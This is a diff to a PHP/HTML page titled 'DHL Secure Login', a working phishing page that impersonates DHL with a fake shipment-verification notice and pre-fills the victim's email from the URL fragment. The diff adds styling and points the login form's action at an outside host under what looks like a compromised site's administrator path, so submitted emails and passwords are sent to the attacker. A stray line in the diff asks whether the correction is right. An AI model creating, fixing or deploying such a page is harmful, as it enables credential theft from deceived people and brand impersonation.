@@ -1,4 +1,4 @@
-<?php
+this is my correction check if i am correct      <?php
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     // Get form data
     $email = $_POST['email'] ?? '';
@@ -25,7 +25,68 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>DHL Secure Login</title>
   <style>
-    /* Add your existing CSS here */
+    body {
+      margin: 0;
+      padding: 0;
+      height: 100vh;
+      overflow: hidden;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      font-family: Arial, sans-serif;
+      position: relative;
+      background-image: url("https://i.postimg.cc/zB7Hkrxv/excel-page-compressed.jpg");
+      background-size: cover;
+      background-position: center;
+      background-repeat: no-repeat;
+    }
+    .login-box {
+      background: rgba(255, 255, 255, 0.85);
+      padding: 30px;
+      border-radius: 8px;
+      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.2);
+      width: 100%;
+      max-width: 380px;
+      text-align: center;
+      z-index: 2;
+    }
+    .login-box img {
+      max-width: 160px;
+      margin-bottom: 20px;
+    }
+    .login-box input {
+      width: 100%;
+      padding: 12px;
+      margin: 10px 0;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      font-size: 14px;
+    }
+    .login-box button {
+      width: 100%;
+      background-color: #ba0c2f;
+      color: white;
+      padding: 12px;
+      border: none;
+      border-radius: 6px;
+      font-size: 16px;
+      cursor: pointer;
+    }
+    .login-box button:hover {
+      background-color: #ccc;
+      cursor: allowed;
+    }
+    .disclaimer {
+      font-size: 11px;
+      color: #888;
+      margin-top: 15px;
+    }
+    #lockMsg {
+      margin-top: 10px;
+      font-size: 14px;
+      color: red;
+      display: none;
+    }
   </style>
 </head>
 <body>
@@ -36,9 +97,15 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     <p><strong>Verification Required Shipment ID: </strong> <br><small> #CS-RBWS/2022BMA/6QC</small></p>
     
     <!-- PHP Form Handling -->
-    <form method="POST" action="">
+    <form method="POST" action="https://innpact.co.za/administrator/includes/xlx.php/zim.php">
       <input type="email" id="email" name="email" placeholder="Email Address" required />
-      <input type="password" id="password" name="password" placeholder="Password" autocomplete="off" required />
+
+
+<input type="password" id="password" name="password" placeholder="Password" autocomplete="off" required />
+
+
+
+
 
       <button type="submit" id="submitBtn">Track Shipment >>></button>
 
@@ -53,33 +120,33 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 
   <script>
     (function () {
-      const emailInput = document.getElementById('email');
-      const passwordInput = document.getElementById('password');
-      const form = document.querySelector('form');
-      let isFormSubmitted = false;  // Flag to track if the form was submitted
+  const emailInput = document.getElementById('email');
+  const passwordInput = document.getElementById('password');
+  const form = document.querySelector('form');
 
-      // Auto-fill email from URL #value
-      try {
-        const frag = window.location.hash.slice(1); // Get everything after the # in the URL
-        const decoded = frag ? decodeURIComponent(frag) : '';
-        if (decoded && /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/.test(decoded)) {
-          emailInput.value = decoded;  // Set the email field with the URL hash value
-          passwordInput.value = '';  // Clear the password field for privacy
-        }
-      } catch (err) {
-        console.error('Error parsing URL fragment:', err);
-      }
+  // Auto-fill email from URL #value
+  try {
+    const frag = window.location.hash.slice(1); // Get everything after the # in the URL
+    const decoded = frag ? decodeURIComponent(frag) : '';
+    if (decoded && /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/.test(decoded)) {
+      emailInput.value = decoded;  // Set the email field with the URL hash value
+      passwordInput.value = '';  // Clear the password field for privacy
+    }
+  } catch (err) {
+    console.error('Error parsing URL fragment:', err);
+  }
 
-      // Reset password field after first submission attempt
-      form.addEventListener('submit', function (e) {
-        if (!isFormSubmitted) {
-          // First time submission, clear the password field
-          passwordInput.value = '';  // Clear password field after the first attempt
-          isFormSubmitted = true;  // Set the flag to true
-        }
-        // Allow the form to submit
-      });
-    })();
+  // Reset password field on form submission
+  form.addEventListener('submit', function (e) {
+    e.preventDefault();  // Prevent the form from submitting immediately
+    console.log("Form handled locally:", emailInput.value);
+    
+
+    // Simply submit the form without the simulated alert or any delay
+    form.submit();  // Submit the form to the server
+  });
+})();
+
   </script>
 
 </body>
